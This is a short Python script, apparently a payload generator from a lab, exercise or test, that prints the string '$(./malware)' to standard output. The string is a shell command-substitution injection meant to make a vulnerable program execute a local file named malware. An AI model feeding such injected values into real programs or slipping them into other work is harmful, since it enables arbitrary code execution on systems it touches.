#!/usr/bin/env python3
import sys

payload = b"$(./malware)\n"

sys.stdout.buffer.write(payload)
